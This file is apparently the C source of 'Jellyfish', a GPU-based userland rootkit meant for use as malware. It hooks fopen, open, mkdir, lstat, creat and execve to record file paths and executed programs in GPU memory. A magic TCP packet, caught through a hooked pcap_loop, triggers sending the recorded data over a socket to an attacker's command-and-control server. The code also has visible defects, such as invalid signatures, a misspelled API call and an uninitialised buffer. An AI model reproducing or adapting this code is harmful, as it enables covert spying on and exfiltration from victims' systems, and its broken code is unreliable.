/*

Copyright (C) 2015  Team Jellyfish

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

*/

#include "jelly.h"
#include "kit.h"
#include "pcap.h"
#include "packet.h"

// get gpu device
cl_device_id create_device(){
    // check platform
    err = clGetPlatformIDs(1, &jelly->platform, NULL);
    if(err < 0){
        // do something
    }

    // access device
    err = clGetDeviceIDs(jelly->platform, CL_DEVICE_TYPE_GPU, 1, &jelly->dev, NULL);
    if(err == CL_DEVICE_NOT_FOUND){
        // do something
    }

    return jelly->dev;
}

// compile kit.cl
cl_program build_program(jelly->ctx, jelly->dev, const char *filename){
    FILE *program_handle;
    char *program_buf, *program_log;
    size_t program_size, log_size;

    // place content from kit.cl into buffer
    program_handle = fopen(filename, "r");
    if(program_handle == NULL){
        // cant read file
    }
    fseek(program_handle, 0, SEEK_END);
    program_size = ftell(program_handle);
    rewind(program_handle);
    program_buf = (char *)malloc(program_size + 1);
    program_buf[program_size] = '\0';
    fread(program_buf, sizeof(char), program_size, program_handle);
    fclose(program_handle);

    // create program from file
    jelly->program = clCreateProgramWithSource(jelly->ctx, 1, (const char**)&program_buf, &program_size, &err);
    if(err < 0){
        // couldn't create program
    }
    free(program_buf);

    // build program
    err = clBuildProgram(jelly->program, 0, NULL, NULL, NULL, NULL);
    if(err < 0){
        // log error
    }

    return jelly->program;
}

// context func
cl_context create_ctx(const cl_device_id *dev){
    jelly->ctx = clCreateContext(NULL, 1, &dev, NULL, NULL, &err);
    if(err < 0){
        // do something
    }
}

void got_packet(unsigned char *args, const struct pcap_pkthdr *header, const unsigned char *packet){
    const struct sniff_ip *ip;
    const struct sniff_tcp *tcp;

    int size_ip, size_tcp;
    unsigned int ack, seq;

    // calculate ip header offset
    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip)*4;
    if(size_ip < 20){
        // bad ip header
    }

    // check for tcp packet
    switch(ip->ip_p){
        case IPPROTO_TCP:
	    break;
	default:
	    return;
    }

    // calculate tcp header offset
    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp)*4;
    if(size_tcp < 20){
        // bad tcp header
    }

    ack = ntohl(tcp->th_ack);
    seq = ntohl(tcp->th_seq);

    if(ack == MAGIC_ACK && seq == MAGIC_SEQ){
        correct_packet = TRUE;  // bool global
    } else{
        correct_packet = FALSE;
    }
}

static void send_data(const char *buffer){
    struct sockaddr_in serv_addr;

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        // socket failed
	close(sock);
    }

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(ADDRESS);
    serv_addr.sin_port = htons(PORT);

    if(connect(sock,(struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0){
        // connection failed
	close(sock);
    }
    
    if(send(sock, buffer, strlen(buffer), 0) < 0){
        // failed to send buffer
	close(sock);
    }
}

void jelly_init(){
    int i;

    for(i = 0; i < SYSCALL_SIZE; i++){
	jelly->dev = create_device();
        jelly->ctx = create_ctx(&jelly->dev);
        jelly->program = build_program(jelly->ctx, jelly->dev, __JELLYXOR__);

	strcpy(buffer, syscall_table[i]);

	/* stick it in the xor blender! */

	input = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer, &err);
	local = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer2, &err);
	group = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer3, &err);
	if(err < 0){
	    // buffer failed
	}

        // device command queue
        jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);
        if(err < 0){
            // queue failed
        }

        // gpu kernel thread
        jelly->kernels[7] = clCreateKernel(jelly->program, jelly_xor, &err);
        if(err < 0){
            // gpu kernel failed
        }

        // gpu kernel args
        err = clSetKernelArg(jelly->kernels[7], 0, sizeof(cl_mem), &input);
        err |= clSetKernelArg(jelly->kernels[7], 1, sizeof(cl_mem), &local);
	err |= clSetKernelArg(jelly->kernels[7], 2, sizeof(cl_mem), &group);
        if(err < 0){
            // args failed
        }

        // host-device comm
        err = clEnqueueNDRangeKernel(jelly->cq, jelly->kernels[7], 1, NULL, &global_xor_size, &local_xor_size, 0, NULL, NULL);
        if(err < 0){
            // enqueue failed
        }

        // read buf from gpu
        err = clEnqueueReadBuffer(jelly->cq, output, CL_TRUE, 0, sizeof(buffer3), buffer3, 0, NULL, NULL);
        if(err < 0){
            // read buffer failed
        } else{
	    // xor'ed syscall example directly from gpu
	    syscall[i].syscall_func = dlsym(RTLD_NEXT, buffer3);
	    buffer3 = "";
	    buffer2 = "";
	    buffer = "";
        }

        clReleaseContext(jelly->ctx);
        clReleaseProgram(jelly->program);
        clReleaseMemObject(input);
        clReleaseMemObject(local);
	clReleaseMemObject(group);
        clReleaseCommandQueue(jelly->cq);
        clReleaseKernel(jelly->kernels[7]);
    }
}

static void limit_buf(const char *buffer){
    if(sizeof(buffer) >= VRAM_LIMIT){
        buffer = "Buffer too big for GPU!";
    }
}

/* Hook syscalls to gpu */

FILE *fopen(const char *path, const char *mode){
    jelly_init();

    jelly->dev = create_device();
    jelly->ctx = create_ctx(&jelly->dev);
    jelly->program = build_program(jelly->ctx, jelly->dev, __JELLYFISH__);

    // what we will store in gpu
    strcpy(buffer, "opened file: ");
    strcat(buffer, path);
    limit_buf(buffer);

    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer, &err);
    output = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer2, &err);
    storage = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer3, &err);
    if(err < 0){
        // buffer failed
    }

    // device command queue
    jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);
    if(err < 0){
        // queue failed
    }

    // gpu kernel thread
    jelly->kernels[0] = clCreateKernel(jelly->program, log_fopen, &err);
    if(err < 0){
        // gpu kernel failed
    }

    // gpu kernel args
    err = clSetKernelArg(jelly->kernels[0], 0, sizeof(cl_mem), &log);
    err |= clSetKernelArg(jelly->kernels[0], 1, sizeof(cl_mem), &output);
    err |= clSetKernelArg(jelly->kernels[0], 2, sizeof(cl_mem), &storage);
    if(err < 0){
        // args failed
    }

    // host-device comm
    err = clEnqueueNDRangeKernel(jelly->cq, jelly->kernels[0], 1, NULL, &global_size, &local_size, 0, NULL, NULL);
    if(err < 0){
        // enqueue failed
    }

    // buffer is now inside gpu

    // if packet from server matches ack-seq keys, dump gpu data, else keep stuffing gpu with more
    if(correct_packet){
        err = clEnqueueReadBuffer(jelly->cq, storage, CL_TRUE, 0, sizeof(buffer), buffer, 0, NULL, NULL);
	if(err < 0){
	    // gpu buffer read failed
	}
	send_data(buffer);  // send dumped data via socket to c&c
	clReleaseMemObject(storage);  // reset storage since attacker chose to dump
    }

    // reset
    buffer3 = "";
    buffer2 = "";
    buffer = "";

    // release gpu memory then start over when syscall is called again
    // we dont release storage object as it will continue to record data to gpu if attacker has not sent magic packet yet
    clReleaseContext(jelly->ctx);
    clReleaseProgram(jelly->program);
    clReleaseMemObject(log);
    clReleaseMemObject(output);
    clReleaseCommandQueue(jelly->cq);
    clReleaseKernel(jelly->kernels[0]);

    return syscall[SYS_FOPEN].syscall_func(path, mode);
}

int mkdir(int dfd, const char *pathname, const char *mode){
    jelly_init();

    jelly->dev = create_device();
    jelly->ctx = create_ctx(&jelly->dev);
    jelly->program = build_program(jelly->ctx, jelly->dev, __JELLYFISH__);

    strcpy(buffer, "made new directory: ");
    strcat(buffer, pathname);
    limit_buf(buffer);

    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer, &err);
    output = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer2, &err);
    storage = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer3, &err);
    if(err < 0){
        // buffer failed
    }

    // device command queue
    jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);
    if(err < 0){
        // queue failed
    }

    // gpu kernel thread
    jelly->kernels[1] = clCreateKernel(jelly->program, log_mkdir, &err);
    if(err < 0){
        // gpu kernel failed
    }

    // gpu kernel args
    err = clSetKernelArg(jelly->kernels[1], 0, sizeof(cl_mem), &log);
    err |= clSetKernelArg(jelly->kernels[1], 1, sizeof(cl_mem), &output);
    err |= clSetKernelArg(jelly->kernels[1], 2, sizeof(cl_mem), &storage);
    if(err < 0){
        // args failed
    }

    // host-device comm
    err = clEnqueueNDRangeKernel(jelly->cq, jelly->kernels[1], 1, NULL, &global_size, &local_size, 0, NULL, NULL);
    if(err < 0){
        // enqueue failed
    }

    // buffer is now inside gpu

    // if packet from server matches ack-seq keys, dump gpu data, else keep stuffing gpu with more
    if(correct_packet){
        err = clEnqueueReadBuffer(jelly->cq, storage, CL_TRUE, 0, sizeof(buffer), buffer, 0, NULL, NULL);
	if(err < 0){
	    // gpu buffer read failed
	}
	send_data(buffer);  // send dumped data via socket to c&c
	clReleaseMemObject(storage);  // reset storage since attacker chose to dump
    }

    // reset
    buffer3 = "";
    buffer2 = "";
    buffer = "";    

    // release gpu memory then start over when syscall is called again
    clReleaseContext(jelly->ctx);
    clReleaseProgram(jelly->program);
    clReleaseMemObject(log);
    clReleaseMemObject(output);
    clReleaseCommandQueue(jelly->cq);
    clReleaseKernel(jelly->kernels[1]);

    return syscall[SYS_MKDIR].syscall_func(dfd, pathname, mode);
}

int lstat(const char *filename, struct stat *buf){
    jelly_init();

    jelly->dev = create_device();
    jelly->ctx = create_ctx(&jelly->dev);
    jelly->program = build_program(jelly->ctx, jelly->dev, __JELLYFISH__);

    strcpy(buffer, "file status on: ");
    strcat(buffer, filename);
    limit_buf(buffer);

    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer, &err);
    output = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer2, &err);
    storage = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer3, &err);
    if(err < 0){
        // buffer failed
    }

    // device command queue
    jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);
    if(err < 0){
        // queue failed
    }

    // gpu kernel thread
    jelly->kernels[2] = clCreateKernel(jelly->program, log_lstat, &err);
    if(err < 0){
        // gpu kernel failed
    }

    // gpu kernel args
    err = clSetKernelArg(jelly->kernels[2], 0, sizeof(cl_mem), &log);
    err |= clSetKernelArg(jelly->kernels[2], 1, sizeof(cl_mem), &output);
    err |= clSetKernelArg(jelly->kernels[2], 2, sizeof(cl_mem), &storage);
    if(err < 0){
        // args failed
    }

    // host-device comm
    err = clEnqueueNDRangeKernel(jelly->cq, jelly->kernels[2], 1, NULL, &global_size, &local_size, 0, NULL, NULL);
    if(err < 0){
        // enqueue failed
    }

    // buffer is now inside gpu

    // if packet from server matches ack-seq keys, dump gpu data, else keep stuffing gpu with more
    if(correct_packet){
        err = clEnqueueReadBuffer(jelly->cq, storage, CL_TRUE, 0, sizeof(buffer), buffer, 0, NULL, NULL);
	if(err < 0){
	    // gpu buffer read failed
	}
	send_data(buffer);  // send dumped data via socket to c&c
	clReleaseMemObject(storage);  // reset storage since attacker chose to dump
    }

    // reset
    buffer3 = "";
    buffer2 = "";
    buffer = "";

    // release gpu memory then start over when syscall is called again
    clReleaseContext(jelly->ctx);
    clReleaseProgram(jelly->program);
    clReleaseMemObject(log);
    clReleaseMemObject(output);
    clReleaseCommandQueue(jelly->cq);
    clReleaseKernel(jelly->kernels[2]);

    return syscall[SYS_LSTAT].syscall_func(filename, buf);
}

int lstat64(const char *filename, struct stat64 *buf){
    jelly_init();

    jelly->dev = create_device();
    jelly->ctx = create_ctx(&jelly->dev);
    jelly->program = build_program(jelly->ctx, jelly->dev, __JELLYFISH__);

    strcpy(buffer, "file status on: ");
    strcat(buffer, filename);
    limit_buf(buffer);

    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer, &err);
    output = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer2, &err);
    if(err < 0){
        // buffer failed
    }

    // device command queue
    jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);
    if(err < 0){
        // queue failed
    }

    // gpu kernel thread
    jelly->kernels[3] = clCreateKernel(jelly->program, log_lstat64, &err);
    if(err < 0){
        // gpu kernel failed
    }

    // gpu kernel args
    err = clSetKernelArg(jelly->kernels[3], 0, sizeof(cl_mem), &log);
    err |= clSetkernelArg(jelly->kernels[3], 0, sizeof(cl_mem), &output);
    if(err < 0){
        // args failed
    }

    // host-device comm
    err = clEnqueueNDRangeKernel(jelly->cq, jelly->kernels[3], 1, NULL, &global_size, &local_size, 0, NULL, NULL);
    if(err < 0){
        // enqueue failed
    }

    // buffer is now inside gpu

    // if packet from server matches ack-seq keys, dump gpu data, else keep stuffing gpu with more
    if(correct_packet){
        err = clEnqueueReadBuffer(jelly->cq, storage, CL_TRUE, 0, sizeof(buffer), buffer, 0, NULL, NULL);
	if(err < 0){
	    // gpu buffer read failed
	}
	send_data(buffer);  // send dumped data via socket to c&c
	clReleaseMemObject(storage);  // reset storage since attacker chose to dump
    }

    // reset
    buffer3 = "";
    buffer2 = "";
    buffer = "";

    // release gpu memory then start over when syscall is called again
    clReleaseContext(jelly->ctx);
    clReleaseProgram(jelly->program);
    clReleaseMemObject(log);
    clReleaseMemObject(output);
    clReleaseCommandQueue(jelly->cq);
    clReleaseKernel(jelly->kernels[3]);

    return syscall[SYS_LSTAT64].syscall_func(filename, buf);
}

int creat(const char *pathname, int mode){
    jelly_init();

    jelly->dev = create_device();
    jelly->ctx = create_ctx(&jelly->dev);
    jelly->program = build_program(jelly->ctx, jelly->dev, __JELLYFISH__);

    strcpy(buffer, "creat() pathname: ");
    strcat(buffer, pathname);
    limit_buf(buffer);

    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer, &err);
    output = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer2, &err);
    storage = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer3, &err);
    if(err < 0){
        // buffer failed
    }

    // device command queue
    jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);
    if(err < 0){
        // queue failed
    }

    // gpu kernel thread
    jelly->kernels[4] = clCreateKernel(jelly->program, log_creat, &err);
    if(err < 0){
        // gpu kernel failed
    }

    // gpu kernel args
    err = clSetKernelArg(jelly->kernels[4], 0, sizeof(cl_mem), &log);
    err |= clSetKernelArg(jelly->kernels[4], 1, sizeof(cl_mem), &output);
    err |= clSetKernelArg(jelly->kernels[4], 2, sizeof(cl_mem), &storage);
    if(err < 0){
        // args failed
    }

    // host-device comm
    err = clEnqueueNDRangeKernel(jelly->cq, jelly->kernels[4], 1, NULL, &global_size, &local_size, 0, NULL, NULL);
    if(err < 0){
        // enqueue failed
    }

    // buffer is now inside gpu

    // if packet from server matches ack-seq keys, dump gpu data, else keep stuffing gpu with more
    if(correct_packet){
        err = clEnqueueReadBuffer(jelly->cq, storage, CL_TRUE, 0, sizeof(buffer), buffer, 0, NULL, NULL);
	if(err < 0){
	    // gpu buffer read failed
	}
	send_data(buffer);  // send dumped data via socket to c&c
	clReleaseMemObject(storage);  // reset storage since attacker chose to dump
    }

    // reset
    buffer3 = "";
    buffer2 = "";
    buffer = "";

    // release gpu memory then start over when syscall is called again
    clReleaseContext(jelly->ctx);
    clReleaseProgram(jelly->program);
    clReleaseMemObject(log);
    clReleaseMemObject(output);
    clReleaseCommandQueue(jelly->cq);
    clReleaseKernel(jelly->kernels[4]);

    return syscall[SYS_CREAT].syscall_func(pathname, mode);
}

int execve(const char *filename, const char **argv, const char **envp){
    jelly_init();

    jelly->dev = create_device();
    jelly->ctx = create_ctx(&jelly->dev);
    jelly->program = build_program(jelly->ctx, jelly->dev, __JELLYFISH__);

    strcpy(buffer, "executed filename: ");
    strcat(buffer, filename);
    limit_buf(buffer);

    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer, &err);
    output = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer2, &err);
    storage = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer3, &err);
    if(err < 0){
        // buffer failed
    }

    // device command queue
    jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);
    if(err < 0){
        // queue failed
    }

    // gpu kernel thread
    jelly->kernels[5] = clCreateKernel(jelly->program, log_execve, &err);
    if(err < 0){
        // gpu kernel failed
    }

    // gpu kernel args
    err = clSetKernelArg(jelly->kernels[5], 0, sizeof(cl_mem), &log);
    err |= clSetKernelArg(jelly->kernels[5], 1, sizeof(cl_mem), &output);
    err |= clSetKernelArg(jelly->kernels[5], 2, sizeof(cl_mem), &storage);
    if(err < 0){
        // args failed
    }

    // host-device comm
    err = clEnqueueNDRangeKernel(jelly->cq, jelly->kernels[5], 1, NULL, &global_size, &local_size, 0, NULL, NULL);
    if(err < 0){
        // enqueue failed
    }

    // buffer is now inside gpu

    // if packet from server matches ack-seq keys, dump gpu data, else keep stuffing gpu with more
    if(correct_packet){
        err = clEnqueueReadBuffer(jelly->cq, storage, CL_TRUE, 0, sizeof(buffer), buffer, 0, NULL, NULL);
	if(err < 0){
	    // gpu buffer read failed
	}
	send_data(buffer);  // send dumped data via socket to c&c
	clReleaseMemObject(storage);  // reset storage since attacker chose to dump
    }

    // reset
    buffer3 = "";
    buffer2 = "";
    buffer = "";

    // release gpu memory then start over when syscall is called again
    clReleaseContext(jelly->ctx);
    clReleaseProgram(jelly->program);
    clReleaseMemObject(log);
    clReleaseMemObject(output);
    clReleaseCommandQueue(jelly->cq);
    clReleaseKernel(jelly->kernels[5]);

    return syscall[SYS_EXECVE].syscall_func(filename, argv, envp);
}

int open(const char *pathname, int flags, mode_t mode){
    jelly_init();

    jelly->dev = create_device();
    jelly->ctx = create_ctx(&jelly->dev);
    jelly->program = build_program(jelly->ctx, jelly->dev, __JELLYFISH__);

    strcpy(buffer, "opened: ");
    strcat(buffer, pathname);
    limit_buf(buffer);

    log = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer, &err);
    output = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer2, &err);
    storage = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buffer3, &err);
    if(err < 0){
        // buffer failed
    }

    // device command queue
    jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);
    if(err < 0){
        // queue failed
    }

    // gpu kernel thread
    jelly->kernels[6] = clCreateKernel(jelly->program, log_open, &err);
    if(err < 0){
        // gpu kernel failed
    }

    // gpu kernel args
    err = clSetKernelArg(jelly->kernels[6], 0, sizeof(cl_mem), &log);
    err |= clSetKernelArg(jelly->kernels[6], 1, sizeof(cl_mem), &output);
    err |= clSetKernelArg(jelly->kernels[6], 2, sizeof(cl_mem), &storage);
    if(err < 0){
        // args failed
    }

    // host-device comm
    err = clEnqueueNDRangeKernel(jelly->cq, jelly->kernels[6], 1, NULL, &global_size, &local_size, 0, NULL, NULL);
    if(err < 0){
        // enqueue failed
    }

    // buffer is now inside gpu

    // if packet from server matches ack-seq keys, dump gpu data, else keep stuffing gpu with more
    if(correct_packet){
        err = clEnqueueReadBuffer(jelly->cq, storage, CL_TRUE, 0, sizeof(buffer), buffer, 0, NULL, NULL);
	if(err < 0){
	    // gpu buffer read failed
	}
	send_data(buffer);  // send dumped data via socket to c&c
	clReleaseMemObject(storage);  // reset storage since attacker chose to dump
    }

    // reset
    buffer3 = "";
    buffer2 = "";
    buffer = "";

    // release gpu memory then start over when syscall is called again
    clReleaseContext(jelly->ctx);
    clReleaseProgram(jelly->program);
    clReleaseMemObject(log);
    clReleaseMemObject(output);
    clReleaseCommandQueue(jelly->cq);
    clReleaseKernel(jelly->kernels[6]);

    return syscall[SYS_OPEN].syscall_func(pathname, flags, mode);
}

// purely experimental, we want to catch ack-seq packet and tell other syscalls "hey, its time to dump what gpu has recorded"
int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, unsigned char *user){
    jelly_init();

    return (long)syscall_list[SYS_PCAP_LOOP].syscall_func(p, cnt, got_packet, user);
}